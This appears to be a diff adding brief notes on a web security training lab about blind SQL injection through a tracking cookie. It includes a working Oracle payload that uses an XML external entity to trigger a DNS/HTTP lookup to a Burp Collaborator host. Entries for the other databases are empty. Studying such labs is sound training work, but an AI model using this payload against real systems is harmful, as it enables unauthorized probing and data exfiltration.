@@ -1,0 +1,19 @@
+Lab #15 - Blind SQL injection with out-of-band interaction
+
+Vulnerable parameter - tracking cookie
+
+End Goal - Cause DNS lookup to burp collaborator
+
+Collaborator link- q2tzz7bo9eqifcc6ocwfzj1rui08ox.burpcollaborator.net
+
+Analysis:
+1. We will fuzz the app with various payloads based on the SQL Injection Cheat Sheet - https://portswigger.net/web-security/sql-injection/cheat-sheet
+This just requires going into Repeater and adding the payload below right after the TrackingId.  
+We've added a concat and put our payload in parens, commenting everything else out at the end.
+
+Oracle (unpatched) - WORKED! - '|| (SELECT extractvalue(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://q2tzz7bo9eqifcc6ocwfzj1rui08ox.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
+Oracle (patched) -  
+Microsoft -
+MySQL - 
+POSTGRESQL - 
+
